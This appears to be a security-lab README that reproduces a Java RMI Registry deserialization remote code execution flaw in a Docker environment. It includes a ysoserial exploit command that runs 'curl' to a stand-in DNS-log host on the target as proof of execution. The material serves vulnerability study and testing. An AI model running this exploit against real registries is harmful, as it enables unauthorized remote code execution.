# Java ≤JDK 8u111 RMI Registry Deserialization Remote Code Execution

[中文版本(Chinese version)](README.zh-cn.md)

Java Remote Method Invocation (RMI) is used for remote procedure calls in Java. Although remote binding is typically disabled, RMI Registry contains a remote binding functionality that can be exploited. By forging serialized data (implementing the Remote interface or dynamically proxying objects that implement the Remote interface) during the binding process, an attacker can trigger a deserialization vulnerability in the Registry when it processes the data. This environment uses commons-collections:3.2.1 for demonstration.

References:

- <https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server>
- <https://github.com/frohoff/ysoserial>

## Environment Setup

Execute the following commands to compile and start the RMI Registry and server:

```
docker compose build
docker compose run -e RMIIP=your-ip -p 1099:1099 rmi
```

Replace `your-ip` with your server's IP address. The client will use this IP to connect to the server.

After startup, the RMI Registry will be listening on port 1099.

## Vulnerability Reproduction

Use the RMIRegistryExploit from ysoserial's exploit package to perform the attack:

```bash
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 "curl your-dnslog-server"
```

![](1.png)

The Registry will return an error, but this is normal and the command will still execute successfully.
